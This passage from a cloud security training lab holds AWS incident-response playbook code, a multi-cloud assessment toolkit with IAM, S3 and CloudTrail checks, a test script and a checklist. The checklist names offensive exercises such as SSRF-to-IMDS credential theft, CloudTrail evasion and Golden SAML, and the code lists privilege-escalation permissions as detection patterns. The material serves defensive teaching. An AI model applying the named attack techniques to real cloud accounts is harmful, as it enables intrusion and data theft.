        results["phases"]["3_investigation"] = self._investigate_actions(
            username, access_key_id
        )

        # Phase 4: Check for persistence — backdoor users, keys, roles
        results["phases"]["4_persistence"] = self._check_persistence(
            username, access_key_id
        )

        # Phase 5: Eradication — remove attacker artifacts
        results["phases"]["5_eradication"] = self._eradicate(
            results["phases"]["4_persistence"]
        )

        results["end_time"] = datetime.now(timezone.utc).isoformat()
        results["status"] = "COMPLETED"

        # Save evidence
        evidence_file = os.path.join(
            self.evidence_dir,
            f"{results['incident_id']}_report.json"
        )
        with open(evidence_file, "w") as f:
            json.dump(results, f, indent=2, default=str)

        return results

    def _disable_access_key(self, username: str, key_id: str) -> dict:
        """Phase 1: Disable the compromised access key."""
        try:
            self.iam.update_access_key(
                UserName=username,
                AccessKeyId=key_id,
                Status="Inactive"
            )
            return {
                "action": "disable_access_key",
                "status": "SUCCESS",
                "key_id": key_id,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
        except Exception as e:
            return {"action": "disable_access_key", "status": "FAILED", "error": str(e)}

    def _collect_user_evidence(self, username: str) -> dict:
        """Phase 2: Collect all configuration evidence for the user."""
        evidence = {}

        # List all access keys
        try:
            keys = self.iam.list_access_keys(UserName=username)
            evidence["access_keys"] = keys.get("AccessKeyMetadata", [])
        except Exception as e:
            evidence["access_keys_error"] = str(e)

        # List attached policies
        try:
            attached = self.iam.list_attached_user_policies(UserName=username)
            evidence["attached_policies"] = attached.get("AttachedPolicies", [])
        except Exception as e:
            evidence["attached_policies_error"] = str(e)

        # List inline policies
        try:
            inline = self.iam.list_user_policies(UserName=username)
            evidence["inline_policies"] = inline.get("PolicyNames", [])
            for pname in evidence["inline_policies"]:
                doc = self.iam.get_user_policy(
                    UserName=username, PolicyName=pname
                )
                evidence[f"inline_policy_{pname}"] = doc["PolicyDocument"]
        except Exception as e:
            evidence["inline_policies_error"] = str(e)

        # List groups
        try:
            groups = self.iam.list_groups_for_user(UserName=username)
            evidence["groups"] = [g["GroupName"] for g in groups.get("Groups", [])]
        except Exception as e:
            evidence["groups_error"] = str(e)

        # Check MFA
        try:
            mfa = self.iam.list_mfa_devices(UserName=username)
            evidence["mfa_devices"] = mfa.get("MFADevices", [])
        except Exception as e:
            evidence["mfa_error"] = str(e)

        return evidence

    def _investigate_actions(self, username: str, key_id: str) -> dict:
        """Phase 3: Query CloudTrail for actions by the compromised principal."""
        investigation = {
            "note": "CloudTrail lookup for compromised principal actions"
        }

        try:
            events = self.ct.lookup_events(
                LookupAttributes=[{
                    "AttributeKey": "Username",
                    "AttributeValue": username
                }],
                MaxResults=50
            )
            investigation["events_found"] = len(events.get("Events", []))
            investigation["events"] = []
            for event in events.get("Events", []):
                investigation["events"].append({
                    "event_name": event.get("EventName"),
                    "event_time": str(event.get("EventTime")),
                    "event_source": event.get("EventSource"),
                    "source_ip": event.get("CloudTrailEvent", "{}"),
                })
        except Exception as e:
            investigation["error"] = str(e)

        # High-risk actions to flag
        investigation["high_risk_actions"] = [
            "CreateRole", "CreatePolicy", "CreatePolicyVersion",
            "AttachRolePolicy", "PutRolePolicy", "CreateUser",
            "CreateAccessKey", "CreateLoginProfile", "UpdateAssumeRolePolicy",
            "PutBucketPolicy", "DeletePublicAccessBlock",
            "StopLogging", "DeleteTrail", "UpdateFunctionCode"
        ]

        return investigation

    def _check_persistence(self, username: str, key_id: str) -> dict:
        """Phase 4: Check for attacker persistence mechanisms."""
        persistence = {"backdoor_users": [], "backdoor_roles": [], "suspicious_keys": []}

        # Check for recently created users (potential backdoors)
        try:
            users = self.iam.list_users()
            for user in users.get("Users", []):
                create_date = user.get("CreateDate")
                if create_date and isinstance(create_date, datetime):
                    if (datetime.now(timezone.utc) - create_date.replace(tzinfo=timezone.utc)) < timedelta(days=7):
                        persistence["backdoor_users"].append({
                            "username": user["UserName"],
                            "created": str(create_date),
                            "arn": user["Arn"]
                        })
        except Exception as e:
            persistence["users_error"] = str(e)

        # Check for roles with overly permissive trust policies
        try:
            roles = self.iam.list_roles()
            for role in roles.get("Roles", []):
                trust = role.get("AssumeRolePolicyDocument", {})
                if isinstance(trust, str):
                    trust = json.loads(trust)
                for stmt in trust.get("Statement", []):
                    principal = stmt.get("Principal", {})
                    if principal == "*" or principal == {"AWS": "*"}:
                        persistence["backdoor_roles"].append({
                            "role_name": role["RoleName"],
                            "issue": "Wildcard trust policy"
                        })
        except Exception as e:
            persistence["roles_error"] = str(e)

        return persistence

    def _eradicate(self, persistence: dict) -> dict:
        """Phase 5: Remove attacker artifacts."""
        actions = []

        # Remove backdoor users
        for user in persistence.get("backdoor_users", []):
            uname = user["username"]
            if "backdoor" in uname.lower() or "stealth" in uname.lower():
                try:
                    # Delete access keys first
                    keys = self.iam.list_access_keys(UserName=uname)
                    for key in keys.get("AccessKeyMetadata", []):
                        self.iam.delete_access_key(
                            UserName=uname, AccessKeyId=key["AccessKeyId"]
                        )
                    # Detach policies
                    attached = self.iam.list_attached_user_policies(UserName=uname)
                    for pol in attached.get("AttachedPolicies", []):
                        self.iam.detach_user_policy(
                            UserName=uname, PolicyArn=pol["PolicyArn"]
                        )
                    # Delete inline policies
                    inline = self.iam.list_user_policies(UserName=uname)
                    for pname in inline.get("PolicyNames", []):
                        self.iam.delete_user_policy(UserName=uname, PolicyName=pname)
                    # Delete user
                    self.iam.delete_user(UserName=uname)
                    actions.append({
                        "action": f"Deleted backdoor user: {uname}",
                        "status": "SUCCESS"
                    })
                except Exception as e:
                    actions.append({
                        "action": f"Failed to delete user {uname}",
                        "error": str(e)
                    })

        return {"eradication_actions": actions}

    def playbook_cryptomining(self) -> dict:
        """Playbook 2: Detect and respond to cryptomining instances."""
        mining_types = ["p3.", "p4d.", "g4dn.", "g5.", "c5.", "c6i."]
        results = {"suspicious_instances": []}

        # In real AWS, iterate all regions
        regions = ["us-east-1"]  # Lab uses single region
        for region in regions:
            try:
                ec2 = boto3.client("ec2", region_name=region,
                                   endpoint_url="http://localhost:4566")
                instances = ec2.describe_instances()
                for res in instances.get("Reservations", []):
                    for inst in res.get("Instances", []):
                        itype = inst.get("InstanceType", "")
                        if any(itype.startswith(mt) for mt in mining_types):
                            results["suspicious_instances"].append({
                                "instance_id": inst["InstanceId"],
                                "type": itype,
                                "region": region,
                                "launch_time": str(inst.get("LaunchTime")),
                                "state": inst.get("State", {}).get("Name")
                            })
            except Exception:
                continue

        return results

    def playbook_data_exfiltration(self, compromised_principal: str) -> dict:
        """Playbook 3: Investigate data exfiltration."""
        investigation = {
            "principal": compromised_principal,
            "cloudtrail_queries": {
                "s3_downloads": (
                    "SELECT eventTime, requestParameters.bucketName, "
                    "requestParameters.key, sourceIPAddress "
                    f"FROM <EVENT_DATA_STORE_ID> "
                    f"WHERE eventName = 'GetObject' "
                    f"AND userIdentity.arn LIKE '%{compromised_principal}%' "
                    "ORDER BY eventTime ASC"
                ),
                "bucket_policy_changes": (
                    "SELECT eventTime, requestParameters.bucketName, "
                    "requestParameters.bucketPolicy "
                    f"FROM <EVENT_DATA_STORE_ID> "
                    "WHERE eventName IN ('PutBucketPolicy','DeletePublicAccessBlock') "
                    f"AND userIdentity.arn LIKE '%{compromised_principal}%'"
                ),
                "snapshot_sharing": (
                    "SELECT eventTime, eventName, requestParameters "
                    f"FROM <EVENT_DATA_STORE_ID> "
                    "WHERE eventName IN ('ModifySnapshotAttribute','ModifyDBSnapshotAttribute') "
                    f"AND userIdentity.arn LIKE '%{compromised_principal}%'"
                )
            }
        }
        return investigation


if __name__ == "__main__":
    import sys
    endpoint = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4566"
    ir = AWSIncidentResponder(endpoint_url=endpoint)

    # Run Playbook 1: Compromised credential
    print("=== Playbook 1: Compromised Credential Response ===")
    result = ir.playbook_compromised_credential(
        username="attacker-user",
        access_key_id="AKIAIOSFODNN7ATTACKER"
    )
    print(json.dumps(result, indent=2, default=str))

    # Run Playbook 2: Cryptomining
    print("\n=== Playbook 2: Cryptomining Detection ===")
    mining = ir.playbook_cryptomining()
    print(json.dumps(mining, indent=2, default=str))

    # Run Playbook 3: Data exfiltration investigation
    print("\n=== Playbook 3: Data Exfiltration Investigation ===")
    exfil = ir.playbook_data_exfiltration("attacker-user")
    print(json.dumps(exfil, indent=2, default=str))
```

**Verification:** The IR playbook disables the compromised key, collects evidence, identifies backdoor users and roles, and removes attacker artifacts. Evidence is saved to `/opt/evidence/` with incident IDs and timestamps.

---

## PART C: FRAMEWORK DEVELOPMENT — Cloud Security Assessment Toolkit (CSAT)

**Objective:** Build a comprehensive, reusable multi-cloud security assessment framework that integrates all offensive and defensive techniques from this lab.

```python
#!/usr/bin/env python3
"""
scripts/csat/cloud_security_assessment.py

Cloud Security Assessment Toolkit (CSAT)
========================================
Multi-cloud security assessment framework integrating:
- AWS IAM privilege escalation scanning
- SSRF/IMDS vulnerability assessment
- S3 bucket security audit
- CloudTrail configuration audit
- GCP service account chain analysis
- Azure Entra ID posture assessment
- Cross-cloud detection rule validation
- Incident response automation
- Report generation (JSON + Markdown)

Usage:
    python cloud_security_assessment.py --provider aws --endpoint http://localhost:4566
    python cloud_security_assessment.py --provider all --report-dir ./assessment-results
"""
import argparse
import json
import os
import sys
from datetime import datetime, timezone
from typing import Optional


class AWSSecurityAssessor:
    """AWS-specific security assessment module."""

    def __init__(self, endpoint_url: Optional[str] = None):
        import boto3
        kwargs = {}
        if endpoint_url:
            kwargs["endpoint_url"] = endpoint_url
        self.iam = boto3.client("iam", **kwargs)
        self.sts = boto3.client("sts", **kwargs)
        self.s3 = boto3.client("s3", **kwargs)
        self.ct = boto3.client("cloudtrail", **kwargs)
        self.findings = []

    def assess_iam(self) -> list:
        """Assess IAM configuration for privilege escalation risks."""
        findings = []

        # Check for users without MFA
        try:
            users = self.iam.list_users()
            for user in users.get("Users", []):
                mfa = self.iam.list_mfa_devices(UserName=user["UserName"])
                if not mfa.get("MFADevices"):
                    findings.append({
                        "id": "AWS-IAM-001",
                        "severity": "HIGH",
                        "title": "IAM User Without MFA",
                        "resource": user["Arn"],
                        "description": f"User {user['UserName']} has no MFA device configured",
                        "remediation": "Enable MFA for all IAM users",
                        "cis_benchmark": "1.10"
                    })
        except Exception:
            pass

        # Check for overpermissive policies
        try:
            policies = self.iam.list_policies(Scope="Local")
            for policy in policies.get("Policies", []):
                version = policy["DefaultVersionId"]
                doc = self.iam.get_policy_version(
                    PolicyArn=policy["Arn"], VersionId=version
                )["PolicyVersion"]["Document"]
                if isinstance(doc, str):
                    doc = json.loads(doc)
                for stmt in doc.get("Statement", []):
                    if stmt.get("Effect") == "Allow":
                        action = stmt.get("Action", [])
                        resource = stmt.get("Resource", [])
                        if (action == "*" or action == ["*"]) and \
                           (resource == "*" or resource == ["*"]):
                            findings.append({
                                "id": "AWS-IAM-002",
                                "severity": "CRITICAL",
                                "title": "Full Admin Policy (Action:* Resource:*)",
                                "resource": policy["Arn"],
                                "description": f"Policy {policy['PolicyName']} grants full admin access",
                                "remediation": "Apply least-privilege permissions",
                                "mitre": "T1078"
                            })
        except Exception:
            pass

        # Check for wildcard trust policies
        try:
            roles = self.iam.list_roles()
            for role in roles.get("Roles", []):
                trust = role.get("AssumeRolePolicyDocument", {})
                if isinstance(trust, str):
                    trust = json.loads(trust)
                for stmt in trust.get("Statement", []):
                    principal = stmt.get("Principal", {})
                    if principal == "*" or principal == {"AWS": "*"}:
                        findings.append({
                            "id": "AWS-IAM-003",
                            "severity": "CRITICAL",
                            "title": "Role With Wildcard Trust Policy",
                            "resource": role["Arn"],
                            "description": f"Role {role['RoleName']} can be assumed by any AWS account",
                            "remediation": "Restrict trust policy to specific accounts and require ExternalId",
                            "mitre": "T1550.001"
                        })
                    elif isinstance(principal, dict):
                        for key, val in principal.items():
                            if isinstance(val, str) and val.endswith(":root"):
                                conditions = stmt.get("Condition", {})
                                has_ext_id = "sts:ExternalId" in str(conditions)
                                if not has_ext_id:
                                    findings.append({
                                        "id": "AWS-IAM-004",
                                        "severity": "HIGH",
                                        "title": "Cross-Account Trust Without ExternalId",
                                        "resource": role["Arn"],
                                        "description": f"Role {role['RoleName']} trusts {val} without ExternalId (confused deputy risk)",
                                        "remediation": "Add sts:ExternalId condition to trust policy",
                                        "mitre": "T1550.001"
                                    })
        except Exception:
            pass

        # Check for dangerous IAM permissions on users
        dangerous_perms = [
            "iam:CreatePolicyVersion", "iam:AttachUserPolicy", "iam:AttachRolePolicy",
            "iam:PutUserPolicy", "iam:PutRolePolicy", "iam:CreateLoginProfile",
            "iam:UpdateLoginProfile", "iam:CreateAccessKey", "iam:PassRole"
        ]
        try:
            users = self.iam.list_users()
            for user in users.get("Users", []):
                user_perms = set()
                # Inline policies
                inline = self.iam.list_user_policies(UserName=user["UserName"])
                for pname in inline.get("PolicyNames", []):
                    doc = self.iam.get_user_policy(
                        UserName=user["UserName"], PolicyName=pname
                    )["PolicyDocument"]
                    if isinstance(doc, str):
                        doc = json.loads(doc)
                    for stmt in doc.get("Statement", []):
                        if stmt.get("Effect") == "Allow":
                            acts = stmt.get("Action", [])
                            if isinstance(acts, str):
                                acts = [acts]
                            user_perms.update(acts)

                found_dangerous = [p for p in dangerous_perms if p in user_perms or "*" in user_perms]
                if found_dangerous:
                    findings.append({
                        "id": "AWS-IAM-005",
                        "severity": "HIGH",
                        "title": "User With Privilege Escalation Permissions",
                        "resource": user["Arn"],
                        "description": f"User {user['UserName']} has dangerous permissions: {', '.join(found_dangerous)}",
                        "remediation": "Remove or restrict dangerous IAM permissions",
                        "mitre": "T1098"
                    })
        except Exception:
            pass

        self.findings.extend(findings)
        return findings

    def assess_s3(self) -> list:
        """Assess S3 bucket security configuration."""
        findings = []
        try:
            buckets = self.s3.list_buckets()
            for bucket in buckets.get("Buckets", []):
                name = bucket["Name"]

                # Check bucket policy for public access
                try:
                    policy = self.s3.get_bucket_policy(Bucket=name)
                    policy_doc = json.loads(policy["Policy"])
                    for stmt in policy_doc.get("Statement", []):
                        principal = stmt.get("Principal", {})
                        if principal == "*" or principal == {"AWS": "*"}:
                            findings.append({
                                "id": "AWS-S3-001",
                                "severity": "CRITICAL",
                                "title": "S3 Bucket With Public Access Policy",
                                "resource": f"arn:aws:s3:::{name}",
                                "description": f"Bucket {name} has wildcard principal in policy",
                                "remediation": "Remove public access or use S3 Block Public Access",
                                "cis_benchmark": "2.1.1",
                                "mitre": "T1537"
                            })
                except Exception:
                    pass

                # Check encryption
                try:
                    enc = self.s3.get_bucket_encryption(Bucket=name)
                except Exception:
                    findings.append({
                        "id": "AWS-S3-002",
                        "severity": "MEDIUM",
                        "title": "S3 Bucket Without Encryption",
                        "resource": f"arn:aws:s3:::{name}",
                        "description": f"Bucket {name} does not have default encryption configured",
                        "remediation": "Enable SSE-S3 or SSE-KMS encryption",
                        "cis_benchmark": "2.1.2"
                    })

                # Check versioning
                try:
                    ver = self.s3.get_bucket_versioning(Bucket=name)
                    if ver.get("Status") != "Enabled":
                        findings.append({
                            "id": "AWS-S3-003",
                            "severity": "LOW",
                            "title": "S3 Bucket Without Versioning",
                            "resource": f"arn:aws:s3:::{name}",
                            "description": f"Bucket {name} does not have versioning enabled",
                            "remediation": "Enable versioning for data protection"
                        })
                except Exception:
                    pass

        except Exception:
            pass

        self.findings.extend(findings)
        return findings

    def assess_cloudtrail(self) -> list:
        """Assess CloudTrail logging configuration."""
        findings = []
        try:
            trails = self.ct.describe_trails()
            if not trails.get("trailList"):
                findings.append({
                    "id": "AWS-CT-001",
                    "severity": "CRITICAL",
                    "title": "No CloudTrail Trail Configured",
                    "resource": "account",
                    "description": "No CloudTrail trail exists — no API audit logging",
                    "remediation": "Create a multi-region CloudTrail trail",
                    "cis_benchmark": "3.1"
                })
            else:
                for trail in trails["trailList"]:
                    name = trail["Name"]

                    # Check multi-region
                    if not trail.get("IsMultiRegionTrail"):
                        findings.append({
                            "id": "AWS-CT-002",
                            "severity": "HIGH",
                            "title": "CloudTrail Not Multi-Region",
                            "resource": trail.get("TrailARN", name),
                            "description": f"Trail {name} only covers one region",
                            "remediation": "Enable multi-region trail",
                            "cis_benchmark": "3.1"
                        })

                    # Check log file validation
                    if not trail.get("LogFileValidationEnabled"):
                        findings.append({
                            "id": "AWS-CT-003",
                            "severity": "MEDIUM",
                            "title": "CloudTrail Log File Validation Disabled",
                            "resource": trail.get("TrailARN", name),
                            "description": f"Trail {name} has log file validation disabled",
                            "remediation": "Enable log file validation for integrity checking",
                            "cis_benchmark": "3.2"
                        })

                    # Check if logging is active
                    try:
                        status = self.ct.get_trail_status(Name=name)
                        if not status.get("IsLogging"):
                            findings.append({
                                "id": "AWS-CT-004",
                                "severity": "CRITICAL",
                                "title": "CloudTrail Logging Stopped",
                                "resource": trail.get("TrailARN", name),
                                "description": f"Trail {name} is not actively logging",
                                "remediation": "Start logging immediately and investigate why it was stopped"
                            })
                    except Exception:
                        pass

                    # Check event selectors for data events
                    try:
                        selectors = self.ct.get_event_selectors(TrailName=name)
                        has_s3_data = False
                        has_lambda_data = False
                        for sel in selectors.get("EventSelectors", []):
                            for dr in sel.get("DataResources", []):
                                if dr["Type"] == "AWS::S3::Object":
                                    has_s3_data = True
                                elif dr["Type"] == "AWS::Lambda::Function":
                                    has_lambda_data = True
                        if not has_s3_data:
                            findings.append({
                                "id": "AWS-CT-005",
                                "severity": "HIGH",
                                "title": "S3 Data Events Not Logged",
                                "resource": trail.get("TrailARN", name),
                                "description": "S3 object-level operations (GetObject, PutObject) are not being logged",
                                "remediation": "Enable S3 data events in CloudTrail event selectors"
                            })
                    except Exception:
                        pass

        except Exception:
            pass

        self.findings.extend(findings)
        return findings

    def get_all_findings(self) -> list:
        return self.findings


class ReportGenerator:
    """Generate assessment reports in JSON and Markdown."""

    def __init__(self, provider: str, findings: list):
        self.provider = provider
        self.findings = findings
        self.timestamp = datetime.now(timezone.utc).isoformat()

    def generate_json(self, output_path: str) -> str:
        report = {
            "report_type": "Cloud Security Assessment",
            "provider": self.provider,
            "generated_at": self.timestamp,
            "summary": self._generate_summary(),
            "findings": self.findings
        }
        with open(output_path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        return output_path

    def generate_markdown(self, output_path: str) -> str:
        summary = self._generate_summary()
        lines = [
            f"# Cloud Security Assessment Report — {self.provider.upper()}",
            f"",
            f"**Generated:** {self.timestamp}",
            f"",
            f"## Summary",
            f"",
            f"| Severity | Count |",
            f"|----------|-------|",
            f"| CRITICAL | {summary['critical']} |",
            f"| HIGH | {summary['high']} |",
            f"| MEDIUM | {summary['medium']} |",
            f"| LOW | {summary['low']} |",
            f"| **TOTAL** | **{summary['total']}** |",
            f"",
            f"---",
            f"",
        ]

        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            sev_findings = [f for f in self.findings if f.get("severity") == severity]
            if sev_findings:
                lines.append(f"## {severity} Findings")
                lines.append("")
                for f in sev_findings:
                    lines.append(f"### [{f['id']}] {f['title']}")
                    lines.append(f"")
                    lines.append(f"- **Resource:** `{f.get('resource', 'N/A')}`")
                    lines.append(f"- **Description:** {f.get('description', 'N/A')}")
                    lines.append(f"- **Remediation:** {f.get('remediation', 'N/A')}")
                    if f.get("cis_benchmark"):
                        lines.append(f"- **CIS Benchmark:** {f['cis_benchmark']}")
                    if f.get("mitre"):
                        lines.append(f"- **MITRE ATT&CK:** {f['mitre']}")
                    lines.append("")

        with open(output_path, "w") as f:
            f.write("\n".join(lines))
        return output_path

    def _generate_summary(self) -> dict:
        summary = {"critical": 0, "high": 0, "medium": 0, "low": 0, "total": 0}
        for f in self.findings:
            sev = f.get("severity", "LOW").lower()
            if sev in summary:
                summary[sev] += 1
            summary["total"] += 1
        return summary


def main():
    parser = argparse.ArgumentParser(
        description="Cloud Security Assessment Toolkit (CSAT)"
    )
    parser.add_argument("--provider", choices=["aws", "gcp", "azure", "all"],
                        default="aws", help="Cloud provider to assess")
    parser.add_argument("--endpoint", default=None,
                        help="Custom endpoint URL (for LocalStack)")
    parser.add_argument("--report-dir", default="./csat-results",
                        help="Output directory for reports")
    parser.add_argument("--checks", nargs="*",
                        choices=["iam", "s3", "cloudtrail", "all"],
                        default=["all"], help="Specific checks to run")
    args = parser.parse_args()

    os.makedirs(args.report_dir, exist_ok=True)

    all_findings = []

    if args.provider in ("aws", "all"):
        print("[*] Running AWS security assessment...")
        assessor = AWSSecurityAssessor(endpoint_url=args.endpoint)

        checks = args.checks if "all" not in args.checks else ["iam", "s3", "cloudtrail"]
        if "iam" in checks:
            print("  [+] Assessing IAM configuration...")
            assessor.assess_iam()
        if "s3" in checks:
            print("  [+] Assessing S3 bucket security...")
            assessor.assess_s3()
        if "cloudtrail" in checks:
            print("  [+] Assessing CloudTrail configuration...")
            assessor.assess_cloudtrail()

        all_findings.extend(assessor.get_all_findings())

    # Generate reports
    print(f"\n[*] Generating reports ({len(all_findings)} findings)...")
    gen = ReportGenerator(args.provider, all_findings)

    json_path = gen.generate_json(
        os.path.join(args.report_dir, f"csat-{args.provider}-{datetime.now(timezone.utc).strftime('%Y%m%d')}.json")
    )
    print(f"  [+] JSON report: {json_path}")

    md_path = gen.generate_markdown(
        os.path.join(args.report_dir, f"csat-{args.provider}-{datetime.now(timezone.utc).strftime('%Y%m%d')}.md")
    )
    print(f"  [+] Markdown report: {md_path}")

    # Print summary
    summary = gen._generate_summary()
    print(f"\n{'='*50}")
    print(f"ASSESSMENT COMPLETE")
    print(f"{'='*50}")
    print(f"CRITICAL: {summary['critical']}")
    print(f"HIGH:     {summary['high']}")
    print(f"MEDIUM:   {summary['medium']}")
    print(f"LOW:      {summary['low']}")
    print(f"TOTAL:    {summary['total']}")

    if summary["critical"] > 0:
        print(f"\n[!!!] {summary['critical']} CRITICAL findings require immediate action!")
        sys.exit(2)
    elif summary["high"] > 0:
        print(f"\n[!] {summary['high']} HIGH findings should be addressed promptly.")
        sys.exit(1)
    else:
        print(f"\n[OK] No critical or high findings.")
        sys.exit(0)


if __name__ == "__main__":
    main()
```

### CLI Interface and Usage

```bash
# Run full AWS assessment against LocalStack
python scripts/csat/cloud_security_assessment.py \
  --provider aws \
  --endpoint http://localhost:4566 \
  --report-dir ./assessment-results

# Run specific checks only
python scripts/csat/cloud_security_assessment.py \
  --provider aws \
  --endpoint http://localhost:4566 \
  --checks iam s3

# View the Markdown report
cat ./assessment-results/csat-aws-*.md
```

### Testing the Framework

```bash
#!/bin/bash
# test_csat.sh — Validate CSAT against the lab environment

set -euo pipefail

echo "[*] Bootstrapping lab environment..."
bash setup/bootstrap-localstack.sh

echo "[*] Running CSAT assessment..."
python scripts/csat/cloud_security_assessment.py \
  --provider aws \
  --endpoint http://localhost:4566 \
  --report-dir /tmp/csat-test

# Verify expected findings
REPORT="/tmp/csat-test/csat-aws-$(date -u +%Y%m%d).json"

echo "[*] Validating findings..."
CRITICAL=$(jq '[.findings[] | select(.severity=="CRITICAL")] | length' "$REPORT")
HIGH=$(jq '[.findings[] | select(.severity=="HIGH")] | length' "$REPORT")

echo "CRITICAL findings: $CRITICAL"
echo "HIGH findings: $HIGH"

# Expected: at least 1 CRITICAL (wildcard trust policy on AdminRole)
# Expected: at least 1 CRITICAL (public S3 bucket)
if [ "$CRITICAL" -lt 2 ]; then
  echo "[FAIL] Expected at least 2 CRITICAL findings"
  exit 1
fi

echo "[PASS] CSAT validation successful — all expected findings detected."
```

---

## Lab Validation Checklist

### Part A: Offensive Exercises

- [ ] **Exercise 1:** IAM privilege escalation via `CreatePolicyVersion` — attacker gains admin access from low-privilege user
- [ ] **Exercise 2:** SSRF-to-IMDS-to-S3 attack chain — full Capital One breach reproduction
- [ ] **Exercise 3:** Lambda `PassRole` exploitation — code execution as admin role via serverless
- [ ] **Exercise 4:** STS role chaining and wildcard trust policy exploitation
- [ ] **Exercise 5:** S3 bucket enumeration, public access discovery, and data exfiltration
- [ ] **Exercise 6:** CloudTrail evasion (StopLogging, event selector manipulation, blind spots)
- [ ] **Exercise 7:** GCP metadata exploitation and service account impersonation chains
- [ ] **Exercise 8:** Azure Entra ID attacks (consent abuse, SP key injection, device code phishing)
- [ ] **Exercise 9:** Identity federation attacks (Golden SAML simulation, OIDC trust abuse)
- [ ] **Exercise 10:** Multi-cloud assessment tooling (Pacu, Prowler, ScoutSuite, CloudFox, Checkov)
- [ ] **Exercise 11:** Serverless exploitation (event injection, `/tmp` persistence, layer poisoning)

### Part B: Defensive Exercises

- [ ] **Exercise 12:** Cloud detection engineering — Sigma rules deployed, CloudWatch/EventBridge alerts configured, Azure Monitor and GCP alerts documented
- [ ] **Exercise 13:** Cloud hardening — AWS SCPs, GCP org policies, Terraform security modules deployed
- [ ] **Exercise 14:** IR playbooks executed — credential compromise, cryptomining, data exfiltration

### Part C: Framework

- [ ] **CSAT framework:** Multi-cloud security assessment toolkit with IAM, S3, CloudTrail checks
- [ ] **Report generation:** JSON and Markdown reports with severity classification, CIS benchmarks, MITRE mappings
- [ ] **CI integration:** Framework runs in automated pipeline with exit codes (0=pass, 1=high, 2=critical)
- [ ] **Validation tests:** Expected findings detected in lab environment
